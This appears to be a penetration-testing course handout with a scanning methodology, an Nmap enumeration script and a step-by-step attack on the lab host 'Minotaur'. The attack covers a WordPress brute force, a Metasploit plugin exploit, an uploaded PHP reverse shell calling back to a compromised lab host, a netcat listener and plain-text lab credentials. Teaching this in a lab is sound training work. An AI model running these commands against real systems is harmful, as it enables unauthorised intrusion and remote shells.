@@ -1,0 +1,1631 @@
+The purpose of this class is to help students learn how to address the common issues in Hacking Challenge Lab courses.
+
+
+Issue 1. Lack of a thorough attack process
+==========================================
+	- Host discovery	
+	- Service discovery
+	- Service version discovery
+	- Vulnerability research
+	- Linux (port 111)/Window (port 445) Enumeration
+	- Webserver vulnerability scan
+	- Directory brute force every webserver
+	- Analyze source code of every web app (look for IPs, usernames/passwords, explanations of how stuff works)
+	- Brute force all services
+
+
+Issue 2. Lack of automation of the process
+==========================================
+	- Research attacks scripts on the internet to enhance your methodology
+
+
+Issue 3. Failing to document all steps being performed and their output
+=======================================================================
+
+
+Issue 4. Lack of sleep during the exam
+======================================
+
+
+Issue 5. Failing to reboot target machines prior to attack
+==========================================================
+
+
+
+--------------------------------------------------------------------------------------------------------------
+
+
+A good strategy to use to prepare would be:
+
+Step 1. Ensure that you are comfortable with Linux
+--------------------------------------------------
+- LinuxSurvival.com (you should be able to comfortably pass all 4 quizzes)
+- Comptia Linux+ (You should be just a hair under a Linux system administrator in skill level, simple shell scripting, and well beyond a Linux user skill level)
+
+You should be very comfortable with the material covered in the videos below (Go through all of them twice if you are new to Linux):
+https://www.youtube.com/playlist?list=PLCDA423AB5CEC8FDB
+https://www.youtube.com/playlist?list=PLtK75qxsQaMLZSo7KL-PmiRarU7hrpnwK
+https://www.youtube.com/playlist?list=PLcUid3OP_4OXOUqYTDGjq-iEwtBf-3l2E
+
+
+
+2. You should be comfortable with the following tools:
+------------------------------------------------------
+
+Nmap:
+https://www.youtube.com/playlist?list=PL6gx4Cwl9DGBsINfLVidNVaZ-7_v1NJIo
+
+Metasploit:
+https://www.youtube.com/playlist?list=PL6gx4Cwl9DGBmwvjJoWhM4Lg5MceSbsja
+
+Burp Suite:
+https://www.youtube.com/playlist?list=PLv95pq8fEyuivHeZB2jeC435tU3_1YGzV
+
+Sqlmap:
+https://www.youtube.com/playlist?list=PLA3E1E7A07FD60C75
+
+Nikto:
+https://www.youtube.com/watch?v=GH9qn_DBzCk
+
+Enum4Linux:
+https://www.youtube.com/watch?v=hA5raaGOQKQ
+
+RPCINFO/SHOWMOUNT:
+https://www.youtube.com/watch?v=FlRAA-1UXWQ
+
+Hydra:
+https://www.youtube.com/watch?v=rLtj8tEmGso
+
+
+
+3. You need to comfortable with basic exploit development
+---------------------------------------------------------
+
+Basic assembly:
+https://www.youtube.com/playlist?list=PLue5IPmkmZ-P1pDbF3vSQtuNquX0SZHpB
+
+Basic exploit development (first 5 videos in the playlist):
+https://www.youtube.com/playlist?list=PLWpmLW-3AVsjcz_VJFvofmIFVTk7T-Ukl
+
+
+4. You need to be comfortable with privilege escalation
+-------------------------------------------------------
+Linux
+https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
+
+Windows
+https://www.sploitspren.com/2018-01-26-Windows-Privilege-Escalation-Guide/
+http://www.fuzzysecurity.com/tutorials/16.html
+
+
+
+
+                            #################################
+----------- ############### # Day 1: Advanced Scanning Labs # ############### -----------
+                            #################################
+
+
+########################
+# Scanning Methodology #
+########################
+ 
+- Ping Sweep
+What's alive?
+------------
+ 
+---------------------------Type This-----------------------------------
+sudo nmap -sP 157.166.226.*
+ 
+-----------------------------------------------------------------------
+ 
+ 
+ 
+    -if -SP yields no results try:
+---------------------------Type This-----------------------------------
+sudo nmap -sL 157.166.226.*
+ 
+-----------------------------------------------------------------------
+ 
+ 
+ 
+    -Look for hostnames:
+---------------------------Type This-----------------------------------
+sudo nmap -sL 157.166.226.* | grep com
+ 
+-----------------------------------------------------------------------
+ 
+ 
+ 
+- Port Scan
+What's where?
+------------
+---------------------------Type This-----------------------------------
+sudo nmap -sS 162.243.126.247
+ 
+-----------------------------------------------------------------------
+ 
+ 
+ 
+- Bannergrab/Version Query
+What versions of software are running
+-------------------------------------
+ 
+---------------------------Type This-----------------------------------
+sudo nmap -sV 162.243.126.247
+ 
+-----------------------------------------------------------------------
+ 
+ 
+ 
+ 
+- Vulnerability Research
+Lookup the banner versions for public exploits
+----------------------------------------------
+http://exploit-db.com
+http://securityfocus.com/bid
+https://packetstormsecurity.com/files/tags/exploit/
+
+
+
+
+
+-----------------------------------------------------------------------------------------------------------------------------
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+--------------------------------------------------------------------------------------
+Some tools to install:
+---------------------------Type This-----------------------------------
+wget --no-check-certificate https://dl.packetstormsecurity.net/UNIX/scanners/propecia.c
+gcc propecia.c -o propecia
+sudo cp propecia /bin
+-----------------------------------------------------------------------
+
+
+
+
+##############################
+# Scanning Process to follow #
+##############################
+
+Step 1: Host Discovery
+----------------------
+
+---------------------------Type This-----------------------------------
+nmap -sP 172.31.2.0/24
+
+nmap -sL 172.31.2.0/24
+
+nmap -sS --open -p 22,445 172.31.2.0/24
+
+propecia 172.31.2 22 > file1
+propecia 172.31.2 445 > file2
+cat file1 file2 > file3
+cat file3 | sort -t . -k 3,3n -k 4,4n | uniq > lab.txt
+cat lab.txt
+-----------------------------------------------------------------------
+
+ 
+Step 2: Port Scan
+-----------------
+nmap -sS <IP-ADDRESS>
+nmap -sU -p 69,161 <IP-ADDRESS>
+
+
+---------------------------Type This-----------------------------------
+sudo nmap -sS 172.31.2.0/24
+sudo nmap -sU -p 69,161 172.31.2.0/24
+-----------------------------------------------------------------------
+ 
+ 
+Step 3: Bannergrab
+------------------
+nmap -sV <IP-ADDRESS>
+nmap -sV -p- <IP-ADDRESS>
+    |
+    ----> Vulnerability Research
+
+---------------------------Type This-----------------------------------
+sudo nmap -sV 172.31.2.0/24
+-----------------------------------------------------------------------
+
+
+
+
+Step 4: Enumerate common Windows/Linux file sharing services
+Step 3 is where most people STOP, and you need to move on and look deeper
+------------------------------------------------------------
+
+---------------------------Type This-----------------------------------
+sudo apt install smbclient libnss-winbind winbind
+git clone https://github.com/portcullislabs/enum4linux.git
+cd enum4linux/
+perl enum4linux.pl -U 172.31.2.11
+
+nmap -Pn -n --open -p111 --script=nfs-ls,nfs-showmount,nfs-statfs,rpcinfo 172.31.2.86
+---------------------------------------------------------------------------------------
+ 
+
+ 
+Step 5: Vulnerability Scan the webservers
+-----------------------------------------
+git clone https://github.com/sullo/nikto.git Nikto2
+ 
+cd Nikto2/program
+ 
+perl nikto.pl -h <IP-ADDRESS>
+ 
+ 
+ 
+Step 6: Directory Bruteforce every webserver
+--------------------------------------------
+sudo apt install -y libcurl4-openssl-dev
+ 
+git clone https://github.com/v0re/dirb.git
+ 
+cd dirb/
+ 
+./configure
+ 
+make
+ 
+./dirb
+ 
+./dirb http://<IP-ADDRESS> wordlists/big.txt
+ 
+ 
+ 
+ 
+ 
+Step 7: Analyze source code of all webpages found
+-------------------------------------------------
+lynx -dump "http://<IP-ADDRESS>" | grep -o "http:.*" > links
+
+If you ever need to download an entire Web site, perhaps for off-line viewing, wget can do the job—for example:
+
+$ wget \
+     --recursive \
+     --no-clobber \
+     --page-requisites \
+     --html-extension \
+     --convert-links \
+     --restrict-file-names=windows \
+     --domains website.org \
+     --no-parent \
+         www.website.org/tutorials/html/
+
+
+This command downloads the Web site www.website.org/tutorials/html/.
+
+The options are:
+
+--recursive: download the entire Web site.
+
+--domains website.org: don't follow links outside website.org.
+
+--no-parent: don't follow links outside the directory tutorials/html/.
+
+--page-requisites: get all the elements that compose the page (images, CSS and so on).
+
+--html-extension: save files with the .html extension.
+
+--convert-links: convert links so that they work locally, off-line.
+
+--restrict-file-names=windows: modify filenames so that they will work in Windows as well.
+
+--no-clobber: don't overwrite any existing files (used in case the download is interrupted and resumed).
+
+
+
+Step 8: Bruteforce any services you find
+----------------------------------------
+sudo apt install -y zlib1g-dev libssl-dev libidn11-dev libcurses-ocaml-dev libpcre3-dev libpq-dev libsvn-dev libssh-dev libmysqlclient-dev libpq-dev libsvn-devcd ~/toolz
+git clone https://github.com/vanhauser-thc/thc-hydra.git
+cd thc-hydra
+./configure
+make
+hydra -L username.txt -P passlist.txt ftp://<IP-ADDRESS
+hydra -l user -P passlist.txt ftp://<IP-ADDRESS
+
+
+
+##################
+# Host Discovery #
+##################
+
+Reason:
+-------
+You have to discover the reachable hosts in the network before you can attack them.
+
+
+Hosts discovery syntax:
+-----------------------
+	nmap -sP 172.31.2.0/24
+	propecia 172.31.2 22 > file1
+	propecia 172.31.2 445 > file2
+	cat file1 file2 > file3
+	cat file3 | sort -t . -k 3,3n -k 4,4n | uniq > lab.txt
+	cat lab.txt
+
+Issues:
+-------
+Issue we had to deal with was hosts that didn't respond to ICMP
+
+
+	Hosts discovered:
+	-----------------
+	172.31.2.11
+	172.31.2.14
+	172.31.2.47
+	172.31.2.64
+	172.31.2.86
+	172.31.2.117
+	172.31.2.157
+	172.31.2.217
+	172.31.2.238
+
+
+
+
+
+
+#####################
+# Service Discovery #
+#####################
+
+Reason:
+-------
+Identifying what services are running on what hosts allows for you to map the network topology.
+
+
+
+Port Scan syntax:
+	sudo nmap -sS -Pn -iL lab.txt
+	sudo nmap -sU -p69,161 -Pn -iL lab.txt
+
+
+
+Services discovered:
+--------------------
+
+joe@metasploit-box:~$ sudo nmap -sS -Pn -iL lab.txt
+
+Starting Nmap 7.60SVN ( https://nmap.org ) at 2018-05-05 14:52 UTC
+Nmap scan report for 172.31.2.11
+Host is up (0.087s latency).
+Not shown: 995 filtered ports
+PORT     STATE SERVICE
+21/tcp   open  ftp
+139/tcp  open  netbios-ssn
+445/tcp  open  microsoft-ds
+3389/tcp open  ms-wbt-server
+9999/tcp open  abyss
+
+Nmap scan report for 172.31.2.11
+Host is up.
+
+PORT    STATE         SERVICE
+69/udp  open|filtered tftp
+161/udp open|filtered snmp
+
+
+Nmap scan report for 172.31.2.14
+Host is up (0.087s latency).
+Not shown: 995 filtered ports
+PORT     STATE SERVICE
+21/tcp   open  ftp
+139/tcp  open  netbios-ssn
+445/tcp  open  microsoft-ds
+3389/tcp open  ms-wbt-server
+9999/tcp open  abyss
+
+
+Nmap scan report for 172.31.2.14
+Host is up.
+
+PORT    STATE         SERVICE
+69/udp  open|filtered tftp
+161/udp open|filtered snmp
+
+
+Nmap scan report for 172.31.2.47
+Host is up (0.086s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+Nmap scan report for 172.31.2.64
+Host is up (0.087s latency).
+Not shown: 997 closed ports
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+6667/tcp open  irc
+
+Nmap scan report for 172.31.2.86
+Host is up (0.086s latency).
+Not shown: 989 closed ports
+PORT     STATE SERVICE
+22/tcp   open  ssh
+53/tcp   open  domain
+80/tcp   open  http
+110/tcp  open  pop3
+111/tcp  open  rpcbind
+139/tcp  open  netbios-ssn
+143/tcp  open  imap
+445/tcp  open  microsoft-ds
+993/tcp  open  imaps
+995/tcp  open  pop3s
+8080/tcp open  http-proxy
+
+Nmap scan report for 172.31.2.117
+Host is up (0.087s latency).
+Not shown: 997 closed ports
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+2020/tcp open  xinupageserver
+
+Nmap scan report for 172.31.2.157
+Host is up (0.087s latency).
+Not shown: 997 closed ports
+PORT   STATE SERVICE
+21/tcp open  ftp
+22/tcp open  ssh
+80/tcp open  http
+
+Nmap scan report for 172.31.2.217
+Host is up (0.087s latency).
+Not shown: 997 closed ports
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+3260/tcp open  iscsi
+
+Nmap scan report for 172.31.2.238
+Host is up (0.087s latency).
+Not shown: 997 closed ports
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+6969/tcp open  acmsoda
+
+Nmap done: 9 IP addresses (9 hosts up) scanned in 14.82 seconds
+
+
+
+
+
+
+
+
+
+##############################################
+# Service Version Discovery (Bannergrabbing) #
+##############################################
+Reason:
+-------
+Identifying what versions of services are running on what hosts allows for you to determine if the hosts are vulnerable to attack.
+
+
+
+Port Scan syntax:
+
+joe@metasploit-box:~$ sudo nmap -sV -Pn -iL lab.txt
+
+Starting Nmap 7.60SVN ( https://nmap.org ) at 2018-05-05 14:56 UTC
+Nmap scan report for 172.31.2.11
+Host is up (0.087s latency).
+Not shown: 995 filtered ports
+PORT     STATE SERVICE       VERSION
+21/tcp   open  ftp           FreeFloat ftpd 1.00
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp  open  microsoft-ds  Microsoft Windows 2003 or 2008 microsoft-ds
+3389/tcp open  ms-wbt-server Microsoft Terminal Service
+9999/tcp open  abyss?
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_server_2003
+
+Nmap scan report for 172.31.2.14
+Host is up (0.087s latency).
+Not shown: 995 filtered ports
+PORT     STATE SERVICE       VERSION
+21/tcp   open  ftp           FreeFloat ftpd 1.00
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp  open  microsoft-ds  Microsoft Windows 2003 or 2008 microsoft-ds
+3389/tcp open  ms-wbt-server Microsoft Terminal Service
+9999/tcp open  abyss?
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_server_2003
+
+Nmap scan report for 172.31.2.47
+Host is up (0.087s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Nmap scan report for 172.31.2.64
+Host is up (0.087s latency).
+Not shown: 997 closed ports
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.6 (Ubuntu Linux; protocol 2.0)
+80/tcp   open  http    Apache httpd 2.4.7 ((Ubuntu))
+6667/tcp open  irc     ngircd
+Service Info: Host: irc.example.net; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Nmap scan report for 172.31.2.86
+Host is up (0.087s latency).
+Not shown: 989 closed ports
+PORT     STATE SERVICE     VERSION
+22/tcp   open  ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
+53/tcp   open  domain      ISC BIND 9.9.5-3 (Ubuntu Linux)
+80/tcp   open  http        Apache httpd 2.4.7 ((Ubuntu))
+110/tcp  open  pop3        Dovecot pop3d
+111/tcp  open  rpcbind     2-4 (RPC #100000)
+139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+143/tcp  open  imap        Dovecot imapd (Ubuntu)
+445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+993/tcp  open  ssl/imap    Dovecot imapd (Ubuntu)
+995/tcp  open  ssl/pop3    Dovecot pop3d
+8080/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
+Service Info: Host: SEDNA; OS: Linux; CPE: cpe:/o:linux:linux_kernel, cpe:/o:campmoca;:ubuntu_linux
+
+Nmap scan report for 172.31.2.117
+Host is up (0.086s latency).
+Not shown: 997 closed ports
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
+80/tcp   open  http    Apache httpd 2.4.7 ((Ubuntu))
+2020/tcp open  ftp     vsftpd 2.0.8 or later
+Service Info: Host: minotaur; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Nmap scan report for 172.31.2.157
+Host is up (0.086s latency).
+Not shown: 997 closed ports
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 2.0.8 or later
+22/tcp open  ssh     OpenSSH 6.6.1 (protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
+
+Nmap scan report for 172.31.2.217
+Host is up (0.087s latency).
+Not shown: 997 closed ports
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
+80/tcp   open  http    nginx
+3260/tcp open  iscsi?
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Nmap scan report for 172.31.2.238
+Host is up (0.087s latency).
+Not shown: 997 closed ports
+PORT     STATE SERVICE  VERSION
+22/tcp   open  ssh      OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0)
+80/tcp   open  http     nginx 1.6.2
+6969/tcp open  acmsoda?
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 9 IP addresses (9 hosts up) scanned in 170.68 seconds
+
+
+
+
+
+
+
+-----------------------------------------------------------------------------------------------------------------------------
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+--------------------------------------------------------------------------------------
+
+#!/bin/bash
+
+# Script made during the CyberWar class for the students to play with, debug, and improve.
+# Take a look at the following websites for ideas:
+# https://github.com/commonexploits/port-scan-automation
+# https://www.commonexploits.com/penetration-testing-scripts/
+# https://github.com/averagesecurityguy/scripts
+# https://github.com/jmortega/europython_ethical_hacking/blob/master/NmapScannerAsync.py
+
+
+
+# Some thoughts of things to add to this script:
+# Shodan queries (API key)
+# AWS scanning (need credentials)
+# Jenkins scanning
+# Active Directory enumeration
+# Github scanning (API key required)
+# Blockchain platforms
+
+
+
+
+
+
+
+#############################################
+# Check to see if script is running as root #
+#############################################
+if [ "$EUID" -ne 0 ]
+  then echo "Please run as root"
+  exit
+fi
+
+
+####################################
+# Check to see if gcc is installed #
+####################################
+file1="/usr/bin/gcc"
+if [ -f "$file1" ]
+then
+	echo "$file is installed."
+    clear
+else
+	echo "$file not found."
+	echo Installing gcc
+    apt-get install -y gcc
+	clear
+fi
+
+########################
+# Make the directories #
+########################
+cd /tmp
+rm -rf customerAudit/
+rm -rf NetworkAudit/
+mkdir -p /tmp/NetworkAudit/discovered_services/
+mkdir -p /tmp/NetworkAudit/scan/windows/
+mkdir -p /tmp/NetworkAudit/scan/sunrpc/
+mkdir -p /tmp/NetworkAudit/scan/ssh/
+mkdir -p /tmp/NetworkAudit/scan/ftp/
+mkdir -p /tmp/NetworkAudit/scan/http/
+mkdir -p /tmp/NetworkAudit/scan/telnet/
+mkdir -p /tmp/NetworkAudit/scan/pop3/
+mkdir -p /tmp/NetworkAudit/scan/printers/
+mkdir -p /tmp/NetworkAudit/scan/mssql_databases/
+mkdir -p /tmp/NetworkAudit/scan/oracle_databases/
+mkdir -p /tmp/NetworkAudit/scan/mysql_databases/
+mkdir -p /tmp/NetworkAudit/scan/mongodb_databases/
+
+
+#####################
+# Download propecia #
+#####################
+file2="/bin/propecia"
+if [ -f "$file2" ]
+then
+	echo "$file is installed."
+    clear
+else
+	echo "$file not found."
+	echo Installing propecia
+    cd /tmp
+    wget --no-check-certificate https://dl.packetstormsecurity.net/UNIX/scanners/propecia.c
+    gcc propecia.c -o propecia
+    cp propecia /bin
+fi
+
+######################
+# Find Windows Hosts #
+######################
+clear
+echo "Scanning for windows hosts."
+propecia 172.31.2 445 >> /tmp/NetworkAudit/discovered_services/windows_hosts
+clear
+echo "Done scanning for windows hosts. FTP is next."
+
+
+##################
+# Find FTP Hosts #
+##################
+echo "Scanning for hosts running FTP."
+propecia 172.31.2 21 >> /tmp/NetworkAudit/discovered_services/ftp_hosts
+clear
+echo "Done scanning for FTP hosts. SSH is next."
+
+##################
+# Find SSH Hosts #
+##################
+echo "Scanning for hosts running SSH."
+propecia 172.31.2 22 >> /tmp/NetworkAudit/discovered_services/ssh_hosts
+clear
+echo "Done scanning for SSH hosts. POP3 is next."
+
+
+###################
+# Find POP3 Hosts #
+###################
+echo "Scanning for hosts running POP3."
+propecia 172.31.2 110 >> /tmp/NetworkAudit/discovered_services/pop3_hosts
+clear
+echo "Done scanning for POP3 hosts. SunRPC is next."
+
+
+#####################
+# Find SunRPC Hosts #
+#####################
+echo "Scanning for hosts running SunRPC."
+propecia 172.31.2 111 >> /tmp/NetworkAudit/discovered_services/sunrpc_hosts
+clear
+echo "Done scanning for SunRPC hosts. Telnet is next."
+
+
+#####################
+# Find Telnet Hosts #
+#####################
+echo "Scanning for hosts running Telnet."
+propecia 172.31.2 23 >> /tmp/NetworkAudit/discovered_services/telnet_hosts
+clear
+echo "Done scanning for Telnet hosts. HTTP is next."
+
+
+###################
+# Find HTTP Hosts #
+###################
+echo "Scanning for hosts running HTTP"
+propecia 172.31.2 80 >> /tmp/NetworkAudit/discovered_services/http_hosts
+clear
+echo "Done scanning for HTTP hosts. HTTPS hosts are next."
+
+
+###################
+# Find HTTPS Hosts #
+###################
+echo "Scanning for hosts running HTTP"
+propecia 172.31.2 443 >> /tmp/NetworkAudit/discovered_services/https_hosts
+clear
+echo "Done scanning for HTTPS hosts. Databases are next."
+
+
+##################
+# Find Databases #
+##################
+echo "Scanning for hosts running MS SQL Server" 
+propecia 172.31.2 1433 >> /tmp/NetworkAudit/discovered_services/mssql_hosts
+clear
+
+echo "Scanning for hosts running Oracle" 
+propecia 172.31.2 1521 >> /tmp/NetworkAudit/discovered_services/oracle_hosts
+clear
+
+echo "Scanning for hosts running Postgres" 
+propecia 172.31.2 5432 >> /tmp/NetworkAudit/discovered_services/postgres_hosts
+clear
+
+echo "Scanning for hosts running MongoDB" 
+propecia 172.31.2 27017 >> /tmp/NetworkAudit/discovered_services/mongodb_hosts
+clear
+
+echo "Scanning for hosts running MySQL" 
+propecia 172.31.2 3306 >> /tmp/NetworkAudit/discovered_services/mysql_hosts
+clear
+echo "Done doing the host discovery. Moving on to nmap'ing each host discovered. Windows hosts are first."
+
+
+###############################
+# Ok, let's do the NMAP files #
+###############################
+clear
+# Windows
+for x in `cat /tmp/NetworkAudit/discovered_services/windows_hosts` ; do nmap -Pn -n --open -p445 --script=msrpc-enum,smb-enum-domains,smb-enum-groups,smb-enum-processes,smb-enum-sessions,smb-enum-shares,smb-enum-users,smb-mbenum,smb-os-discovery,smb-security-mode,smb-server-stats,smb-system-info,smbv2-enabled,stuxnet-detect $x > /tmp/NetworkAudit/scan/windows/$x ; done
+echo "Done with Windows."
+
+clear
+# FTP
+for x in `cat /tmp/NetworkAudit/discovered_services/ftp_hosts` ; do nmap -Pn -n --open -p21 --script=banner,ftp-anon,ftp-bounce,ftp-proftpd-backdoor,ftp-vsftpd-backdoor $x > /tmp/NetworkAudit/scan/ftp/$x ; done
+echo "Done with FTP."
+
+clear
+# SSH
+for x in `cat /tmp/NetworkAudit/discovered_services/ssh_hosts` ; do nmap -Pn -n --open -p22 --script=sshv1,ssh2-enum-algos $x > /tmp/NetworkAudit/scan/ssh/$x ; done
+echo "Done with SSH."
+
+clear
+# SUNRPC
+for x in `cat /tmp/NetworkAudit/discovered_services/sunrpc_hosts` ; do nmap -Pn -n --open -p111 --script=nfs-ls,nfs-showmount,nfs-statfs,rpcinfo $x > /tmp/NetworkAudit/scan/sunrpc/$x ; done
+echo "Done with SunRPC."
+
+clear
+# POP3
+for x in `cat /tmp/NetworkAudit/discovered_services/pop3_hosts` ; do nmap -Pn -n --open -p110 --script=banner,pop3-capabilities,pop3-ntlm-info,ssl*,tls-nextprotoneg  $x > /tmp/NetworkAudit/scan/pop3/$x ; done
+echo "Done with POP3."
+
+# clear
+# HTTP Fix this...maybe use https://github.com/jmortega/europython_ethical_hacking/blob/master/NmapScannerAsync.py
+# as a good reference for what nmap nse scripts to run against port 80 and 443
+# for x in `cat /tmp/NetworkAudit/discovered_services/http_hosts` ; do nmap -sV -O --script-args=unsafe=1 --script-args=unsafe  --script "auth,brute,discovery,exploit,external,fuzzer,intrusive,malware,safe,version,vuln and not(http-slowloris or http-brute or http-enum or http-form-fuzzer)" $x > /tmp/NetworkAudit/scan/http/$x ; done
+# echo "Done with HTTP."
+
+
+# clear
+# HTTP Fix this...maybe use https://github.com/jmortega/europython_ethical_hacking/blob/master/NmapScannerAsync.py
+# as a good reference for what nmap nse scripts to run against port 80 and 443
+# for x in `cat /tmp/NetworkAudit/discovered_services/https_hosts` ; do nmap -sV -O --script-args=unsafe=1 --script-args=unsafe  --script "auth,brute,discovery,exploit,external,fuzzer,intrusive,malware,safe,version,vuln and not(http-slowloris or http-brute or http-enum or http-form-fuzzer)" $x > /tmp/NetworkAudit/scan/http/$x ; done
+# echo "Done with HTTP."
+
+
+clear
+# SQL Servers
+for x in `cat /tmp/NetworkAudit/discovered_services/mssql_hosts` ; do -Pn -n --open -p1433 --script=ms-sql-dump-hashes,ms-sql-empty-password,ms-sql-info $x > /tmp/NetworkAudit/scan/mssql_databases/$x ; done
+echo "Done with MS SQL."
+
+clear
+# Oracle Servers
+# FIX THIS: needs brute force wordlists for this to run correctly
+# for x in `cat /tmp/NetworkAudit/discovered_services/oracle_hosts` ; do nmap -Pn -n --open -p1521 --script=oracle-sid-brute --script oracle-enum-users --script-args oracle-enum-users.sid=ORCL,userdb=orausers.txt $x >> /tmp/NetworkAudit/scan/oracle_databases/$x ; done
+# echo "Done with Oracle."
+
+clear
+# MongoDB 
+for x in `cat /tmp/NetworkAudit/discovered_services/mongodb_hosts` ; do nmap -Pn -n --open -p27017 --script=mongodb-databases,mongodb-info  $x > /tmp/NetworkAudit/scan/mongodb_databases/$x ; done
+echo "Done with MongoDB."
+
+ 
+clear
+# MySQL Servers
+for x in `cat /tmp/NetworkAudit/discovered_services/mysql_hosts` ; do nmap -Pn -n --open -p3306 --script=mysql-databases,mysql-empty-password,mysql-info,mysql-users,mysql-variables $x >> /tmp/NetworkAudit/scan/mysql_databases/$x ; done
+echo "Done with MySQL."
+
+
+# Add postgres nse scripts 
+# References:
+# https://nmap.org/nsedoc/lib/pgsql.html
+# https://nmap.org/nsedoc/scripts/pgsql-brute.html
+# 
+
+echo " "
+echo " "
+sleep 1
+clear
+echo "Done, now check your results."
+sleep 2
+clear
+cd /tmp/NetworkAudit/scan/
+ls
+
+
+
+----------------------------------------------------------------------------------------------------------------------------
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+--------------------------------------------------------------------------------------
+
+                            ######################################
+----------- ############### # Day 2: Attacking Hosts in the lab  ################ -----------
+                            ######################################
+
+######################
+# Attacking Minotaur #
+######################
+ 
+Step 1: Portscan/Bannergrab the target host
+---------------------------Type This-----------------------------------
+sudo nmap -sV 172.31.2.117
+-----------------------------------------------------------------------
+ 
+ 
+ 
+Step 2: Vulnerability scan the web server
+---------------------------Type This-----------------------------------
+nikto.pl -h 172.31.2.117
+-----------------------------------------------------------------------
+ 
+ 
+ 
+Step 3: Directory brute-force the webserver
+---------------------------Type This-----------------------------------
+dirb http://172.31.2.117 /usr/share/dirb/wordlists/big.txt
+-----------------------------------------------------------------------
+ 
+### dirb output ###
+==> DIRECTORY: http://172.31.2.117/bull/
+-----------------------------------------------------------------------
+ 
+ 
+Step 4: Run wordpress vulnerability scanner
+---------------------------Type This-----------------------------------
+wpscan --url 172.31.2.117/bull/ -r --enumerate u --enumerate p --enumerate t --enumerate tt
+
+
+cewl -w words.txt http://172.31.2.117/bull/
+
+
+cewl http://172.31.2.117/bull/ -d 1 -m 6 -w whateverbro.txt
+
+wc -l whateverbro.txt 
+
+john --wordlist=whateverbro.txt --rules --stdout > words-john.txt
+
+wc -l words-john.txt
+
+wpscan --username bully --url http://172.31.2.117/bull/ --wordlist words-john.txt --threads 10
+-----------------------------------------------------------------------
+
+ 
+
+
+
+Step 5: Attack vulnerable Wordpress plugin with Metasploit (just doing the exact same attack with MSF)
+---------------------------Type This-----------------------------------
+msfconsole
+ 
+use exploit/unix/webapp/wp_slideshowgallery_upload
+ 
+set RHOST 172.31.2.117
+ 
+set RPORT 80
+ 
+set TARGETURI /bull
+ 
+set WP_USER bully
+ 
+set WP_PASSWORD Bighornedbulls
+ 
+exploit
+-----------------------------------------------------------------------
+ 
+Damn...that didn't work...Can't reverse shell from inside the network to a host in the VPN network range.
+This is a lab limitation that I implemented to stop students from compromising hosts in the lab network
+and then from the lab network attacking other students.
+ 
+ 
+---------------------------Type This-----------------------------------
+wget http://pentestmonkey.net/tools/php-reverse-shell/php-reverse-shell-1.0.tar.gz
+ 
+tar -zxvf php-reverse-shell-1.0.tar.gz
+ 
+cd ~/toolz/php-reverse-shell-1.0/
+ 
+nano php-reverse-shell.php
+-----------------------------------------------------------------------
+    ***** change the $ip and $port variables to a host that you have already compromised in the network
+    ***** for this example I chose 172.31.2.64 and kept port 1234
+ 
+ 
+---------------------------Type This-----------------------------------
+chmod 777 php-reverse-shell.php
+cp php-reverse-shell.php ..
+-----------------------------------------------------------------------
+ 
+ 
+
+Browse to this link https://www.exploit-db.com/raw/34681/ and copy all of the text from it.
+Paste the contents of this link into a file called wp_gallery_slideshow_146_suv.py
+--------------------------Type This-----------------------------------
+python wp_gallery_slideshow_146_suv.py -t http://172.31.2.117/bull/ -u bully -p Bighornedbulls -f php-reverse-shell.php
+ 
+-----------------------------------------------------------------------
+ 
+ 
+ 
+Set up netcat listener on previously compromised host
+---------------------------Type This-----------------------------------
+ssh -l webmin 172.31.2.64
+    webmin1980
+ 
+
+nc -lvp 1234
+-----------------------------------------------------------------------
+ 
+ 
+ 
+ 
+---------------------Type This in your browser ------------------------
+http://172.31.2.117/bull//wp-content/uploads/slideshow-gallery/php-reverse-shell.php
+-----------------------------------------------------------------------
+ 
+ 
+Now check your listener to see if you got the connection
+---------------------------Type This-----------------------------------
+id
+ 
